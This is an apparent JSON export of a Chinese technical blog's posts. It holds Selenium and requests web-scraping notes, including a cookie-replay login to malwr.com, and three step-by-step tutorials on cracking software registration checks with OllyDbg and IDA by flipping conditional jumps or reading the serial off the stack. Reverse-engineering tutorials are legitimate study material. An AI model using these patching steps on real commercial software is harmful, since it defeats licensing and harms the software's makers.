== False: #time.sleep(6) locator=(By.ID,&quot;detail_frame&quot;) # driver.implicitly_wait(30) #driver.find_element_by_xpath(&quot;.//*[@id=&#39;detail_frame&#39;]/div[1]/div/div[1]/div[1]&quot;) try: WebDriverWait(driver, 60).until(EC.presence_of_element_located(locator)) driver.back() except: driver.refresh() # else: # pass # #driver.refresh() 遇到的问题： 注意:Frame&#x2F;Iframe原因定位不到元素： 1.这个是最常见的原因，首先要理解下frame的实质，frame中实际上是嵌入了另一个页面，而webdriver每次只能在一个页面识别，因此需要先定位到相应的frame，对那个页面里的元素进行定位。 例如：如果iframe有name或id的话，直接使用switch_to_frame(“name值”)或switch_to_frame(“id值”)。如下： driver=webdriver.Firefox() driver.get(r&#39;http://www.126.com/&#39;) driver.switch_to_frame(&#39;x-URS-iframe&#39;) #需先跳转到iframe框架 username=driver.find_element_by_name(&#39;email&#39;) username.clear() 如果iframe没有name或id的话，则可以通过下面的方式定位： #先定位到iframe elementi= driver.find_element_by_class_name(&#39;APP-editor-iframe&#39;) #再将定位对象传给switch_to_frame()方法 driver.switch_to_frame(elementi) 如果完成操作后，可以通过switch_to.parent_content()方法跳出当前iframe，或者还可以通过switch_to.default_content()方法跳回最外层的页面 2.关于窗口的切换用到switch_to_window(handle) 方法 例如： all_handles = driver.window_handles #获取所有窗口句柄 for handle in all_handles: if handle != now_handle: print handle #输出待选择的窗口句柄 driver.switch_to_window(handle) time.sleep(5) try: filename=driver.find_element_by_xpath(&quot;.//*[@id=&#39;baseinfo&#39;]/div/table/tbody/tr[1]/td[2]/p&quot;).text+&quot;.html&quot; with open(filename, &#39;w&#39;) as fp: fp.write(driver.page_source.encode(&#39;utf-8&#39;)) except: print str(j)+str(i) time.sleep(5) driver.close() #关闭当前窗口 time.sleep(3) print now_handle #输出主窗口句柄 driver.switch_to_window(now_handle) #返回主窗口 time.sleep(5) 12.requires库的使用两种模拟登陆的方式： 构建请求的表单数据来登录 # -*- coding: utf-8 -*- # import requests # import ConfigParser # import json # cf = ConfigParser.ConfigParser() # cf.read(&#39;config.ini&#39;) # username = cf.get(&#39;info&#39;, &#39;username&#39;) # password = cf.get(&#39;info&#39;, &#39;password&#39;) # csrfmiddlewaretoken=cf.get(&#39;info&#39;,&#39;csrfmiddlewaretoken&#39;) # ##g-recaptcha-response=cf.get(&#39;info&#39;,&#39;g-recaptcha-response&#39;) # session = requests.session() # login_data = &#123;&#39;username&#39;: username, &#39;password&#39;: password,&#39;csrfmiddlewaretoken&#39;:csrfmiddlewaretoken,&#39;g-recaptcha-response&#39;:cf.get(&#39;info&#39;,&#39;g-recaptcha-response&#39;)&#125; # header = &#123; # &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36&#39;, # &#39;Host&#39;: &#39;malwr.com&#39;, # &#39;Referer&#39;: &#39;https://malwr.com/account/login/&#39; # &#125; # # r = session.get(&#39;http://malwr.com/&#39;) # 实现验证码登陆 # r = session.post(&#39;https://malwr.com/account/login/&#39;, data=login_data, headers=header) # with open(&#39;123.html&#39;, &#39;w&#39;) as fp: # fp.write(r.content) 构建cookies来模拟登陆 # -*- coding: utf-8 -*- import requests import ConfigParser import json cf = ConfigParser.ConfigParser() cf.read(&#39;config.ini&#39;) cookies = cf.items(&#39;cookies&#39;) cookies = dict(cookies) header = &#123; &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#39;, &#39;Host&#39;: &#39;malwr.com&#39;, &#39;Referer&#39;: &#39;https://malwr.com/account/login/&#39; &#125; session = requests.session() r = session.get(&#39;http://malwr.com/analysis/&#39;, cookies=cookies,headers=header) # 实现验证码登陆 with open(&#39;login.html&#39;, &#39;w&#39;) as fp: fp.write(r.content)","categories":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"破解实例1","slug":"逆向/破解实例1","date":"2017-07-05T16:00:00.000Z","updated":"2024-03-12T09:46:26.789Z","comments":true,"path":"2017/07/06/逆向/破解实例1/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E9%80%86%E5%90%91/%E7%A0%B4%E8%A7%A3%E5%AE%9E%E4%BE%8B1/","excerpt":"一、样本基本信息 U盘监控器破解实例链接：http://pan.baidu.com/s/1dEDiSYt 密码：srpe 二、分析过程 首先打开u盘监控器，获取注册关键信息， 如下的”注册失败”即为关键信息 使用FlexHEX获取该字符串的文件偏移地址，所谓文件偏移地址就是文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0。用十六进制工具（如WINHEX）打开文件所显示的地址就是文件偏移地址。如图”注册失败”的文件偏移地址为0x00081A79 使用OD获取该字符串的内存地址内存地址等于装载基址+文件偏移地址装载基址可以通过OD查看，如图可以看到0x00400000就是装载基址。即该字符串地址常量为0x481a79,右键查找&#x2F;常量 输入0x481a79 可以找到字符串所在位置，对应内存地址为0x00405d2d 使用W32DASM 找到该地址的上一个判断语句的位置。,如图，记下地址0x405cd2","text":"一、样本基本信息 U盘监控器破解实例链接：http://pan.baidu.com/s/1dEDiSYt 密码：srpe 二、分析过程 首先打开u盘监控器，获取注册关键信息， 如下的”注册失败”即为关键信息 使用FlexHEX获取该字符串的文件偏移地址，所谓文件偏移地址就是文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0。用十六进制工具（如WINHEX）打开文件所显示的地址就是文件偏移地址。如图”注册失败”的文件偏移地址为0x00081A79 使用OD获取该字符串的内存地址内存地址等于装载基址+文件偏移地址装载基址可以通过OD查看，如图可以看到0x00400000就是装载基址。即该字符串地址常量为0x481a79,右键查找&#x2F;常量 输入0x481a79 可以找到字符串所在位置，对应内存地址为0x00405d2d 使用W32DASM 找到该地址的上一个判断语句的位置。,如图，记下地址0x405cd2 在OD中找到此地址位置，右键汇编于此处，jg 改为jl 然后复制到二进制文件，保存文件即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"破解实例2","slug":"逆向/破解实例2","date":"2017-07-05T16:00:00.000Z","updated":"2024-03-12T09:46:31.185Z","comments":true,"path":"2017/07/06/逆向/破解实例2/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E9%80%86%E5%90%91/%E7%A0%B4%E8%A7%A3%E5%AE%9E%E4%BE%8B2/","excerpt":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1o8lwLiq 二、分析过程 首先打开样本程序，得到关键字符串“try again”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 双击字符串，进入IDA-View 窗口，按table键转换为Pseudocode 窗口，这是反编译过来的c代码，观察它的逻辑。找到判断，跳转的位置。如图 可以看出调用了istrcmpA函数，比较输入字符串和要找的字符串，然后跳转。在这一行 代码处按table键切换窗口找到反汇编位置，如图是代码段0x00401094 的位置。 打开OD找到这个位置。此时我们在这个位置下断点可以看到，堆栈区显示两个字符串，一个是我们输入的字符串，而另一个就是实际的序列号。 有两种方法可以破解，第一种方法是直接输入这个序列号就行了，另一种是我们找到跳转到显示“try again ”的位置，修改跳转指令，步骤如下：","text":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1o8lwLiq 二、分析过程 首先打开样本程序，得到关键字符串“try again”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 双击字符串，进入IDA-View 窗口，按table键转换为Pseudocode 窗口，这是反编译过来的c代码，观察它的逻辑。找到判断，跳转的位置。如图 可以看出调用了istrcmpA函数，比较输入字符串和要找的字符串，然后跳转。在这一行 代码处按table键切换窗口找到反汇编位置，如图是代码段0x00401094 的位置。 打开OD找到这个位置。此时我们在这个位置下断点可以看到，堆栈区显示两个字符串，一个是我们输入的字符串，而另一个就是实际的序列号。 有两种方法可以破解，第一种方法是直接输入这个序列号就行了，另一种是我们找到跳转到显示“try again ”的位置，修改跳转指令，步骤如下： 方法1：输入“&#96;mddggzdl” ，显示”very good”. 方法2：分析断点附近的指令，单步调试发现跳转指令在指令“0040109A”处 当跳转实现时，跳转到”success” ,当跳转没有实现时，跳转到“fail” 。我们只需要修改这个跳转条件，让它的跳转调到”success”即可。分析指令我们知道把JE 改为“JNE”即可。如图：右键汇编，改JE为JNE，然后汇编，右键复制到可执行文件-所有修改-全部复制，在弹框中右键保存文件，输入保存的文件名，保存即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"破解实例3","slug":"逆向/破解实例3","date":"2017-07-05T16:00:00.000Z","updated":"2024-03-12T09:46:35.284Z","comments":true,"path":"2017/07/06/逆向/破解实例3/","link":"","permalink":"http://zwjsfdbb.top/2017/07/06/%E9%80%86%E5%90%91/%E7%A0%B4%E8%A7%A3%E5%AE%9E%E4%BE%8B3/","excerpt":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1bp1YnT1 二、分析过程 首先打开样本程序，得到关键字符串“序列号错误，再来一次！”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 发现并没有关键字符串，然后我们打开导入表，发现导入表中有istrcmpA函数，这是一个很重要的函数，比较两个字符串是否相等，双加该字符串，得到IDA-View的导入表中IstrcmpA的位置，鼠标放在函数名的位置，按下X键，查找调用该函数的位置，点击进去，发现调用这个函数的位置，分析可知此处就是输入字符串进行比较的位置。","text":"一、样本基本信息 破解样本 链接为 http://pan.baidu.com/s/1bp1YnT1 二、分析过程 首先打开样本程序，得到关键字符串“序列号错误，再来一次！”，如下 打开IDA加载该样本程序。打开View-&gt;Open Subviws-&gt;Strings 字符串窗口，搜索关键字符串。 发现并没有关键字符串，然后我们打开导入表，发现导入表中有istrcmpA函数，这是一个很重要的函数，比较两个字符串是否相等，双加该字符串，得到IDA-View的导入表中IstrcmpA的位置，鼠标放在函数名的位置，按下X键，查找调用该函数的位置，点击进去，发现调用这个函数的位置，分析可知此处就是输入字符串进行比较的位置。 打开OD找到这个位置。此时我们在这个位置下断点运行程序，输入字符串“111111”，和“222222”，发现在堆栈区的字符串为“2009”和”222222“，故猜测字符串”111111“经过运算，得到2009然后和222222，进行比较，如果相等，即成功。实际测试发现果然如此。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"hexo 搭建博客(github)","slug":"杂学/搭建博客","date":"2017-07-05T03:01:39.000Z","updated":"2024-03-12T09:48:09.374Z","comments":true,"path":"2017/07/05/杂学/搭建博客/","link":"","permalink":"http://zwjsfdbb.top/2017/07/05/%E6%9D%82%E5%AD%A6/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/","excerpt":"步骤如下1、新建仓库 username.github.io 2、新建read.me 3、安装node.js4、安装git 5、安装hexo 6、修改hexo 的配置文件，和github仓库建立关联 7、购买域名，绑定username.github.io 8、发布博客 hexo clean &amp;&amp;hexo g &amp;&amp;hexo d 9、修改主题 详见 10、加入评论和订阅功能 （gittalk）","text":"步骤如下1、新建仓库 username.github.io 2、新建read.me 3、安装node.js4、安装git 5、安装hexo 6、修改hexo 的配置文件，和github仓库建立关联 7、购买域名，绑定username.github.io 8、发布博客 hexo clean &amp;&amp;hexo g &amp;&amp;hexo d 9、修改主题 详见 10、加入评论和订阅功能 （gittalk）","categories":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]}],"categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"},{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"应急响应","slug":"应急响应","permalink":"http://zwjsfdbb.top/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"},{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"},{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"},{"name":"流量分析","slug":"流量分析","permalink":"http://zwjsfdbb.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/categories/%E6%9D%82%E5%AD%A6/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"},{"name":"编程","slug":"编程","permalink":"http://zwjsfdbb.top/tags/%E7%BC%96%E7%A8%8B/"},{"name":"应急响应","slug":"应急响应","permalink":"http://zwjsfdbb.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"},{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"},{"name":"黑客工具","slug":"黑客工具","permalink":"http://zwjsfdbb.top/tags/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"},{"name":"流量分析","slug":"流量分析","permalink":"http://zwjsfdbb.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"杂学","slug":"杂学","permalink":"http://zwjsfdbb.top/tags/%E6%9D%82%E5%AD%A6/"}]}